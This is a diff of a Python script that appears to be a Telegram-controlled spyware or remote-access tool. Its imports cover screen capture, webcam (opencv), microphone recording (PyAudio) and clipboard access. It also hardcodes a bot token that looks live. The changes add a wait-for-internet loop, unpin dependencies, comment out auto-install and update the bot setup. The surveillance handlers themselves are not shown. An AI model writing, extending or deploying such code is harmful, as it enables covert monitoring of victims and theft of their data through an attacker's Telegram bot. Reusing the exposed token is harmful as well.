@@ -2,17 +2,48 @@ import sys
 import subprocess
 import logging
 import os
+import socket
+import time
+import warnings
+warnings.filterwarnings("ignore", category=DeprecationWarning)
 
+def is_connected(host="8.8.8.8", port=53, timeout=3):
+    """
+    Check internet connectivity by trying to connect to a known host.
+    
+    Args:
+        host (str): The host to connect to. Defaults to Google's DNS.
+        port (int): The port to use for the connection.
+        timeout (int): Connection timeout in seconds.
+        
+    Returns:
+        bool: True if connection is successful, False otherwise.
+    """
+    try:
+        socket.setdefaulttimeout(timeout)
+        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
+        return True
+    except OSError:
+        return False
+
+def wait_for_internet_connection(retry_interval=5):
+    """
+    Continuously check for internet connectivity until successful.
+    
+    Args:
+        retry_interval (int): Seconds to wait between retries.
+    """
+    while not is_connected():
+        time.sleep(retry_interval)
+    
 def install_packages():
-    packages = [
-        "aiogram~=3.4.1",
-        "requests~=2.31.0",
-        "psutil~=5.9.7",
-        "Pillow~=10.2.0",
-        "opencv-python~=4.9.0.80",
-        "PyAudio~=0.2.14",
-        "pyperclip~=1.8.2",
-    ]
+    packages = ["aiogram",
+        "requests",
+        "psutil",
+        "Pillow",
+        "opencv-python",
+        "PyAudio",
+        "pyperclip",]
     
     for package in packages:
         try:
@@ -34,8 +65,8 @@ def install_packages():
         except Exception as e:
             logging.error(f"An unexpected error occurred while installing {package}: {e}")
 
-install_packages()
-
+wait_for_internet_connection()
+#install_packages()
 
 from aiogram.types import Message
 from aiogram.filters.command import Command
@@ -49,10 +80,12 @@ from PIL import ImageGrab
 import pyaudio
 import wave
 from sys import platform
-import warnings
-warnings.filterwarnings("ignore", category=DeprecationWarning)
-
-bot = Bot(token="8172078442:AAFvllCASC1XUCBHmyeC5o7sshWssVLlcDA", parse_mode="HTML")
+from aiogram import Bot
+from aiogram.client.bot import DefaultBotProperties
+bot = Bot(
+    token="8172078442:AAFvllCASC1XUCBHmyeC5o7sshWssVLlcDA",
+    default=DefaultBotProperties(parse_mode="HTML")
+)
 
 dp = Dispatcher()
 router: Router = Router()
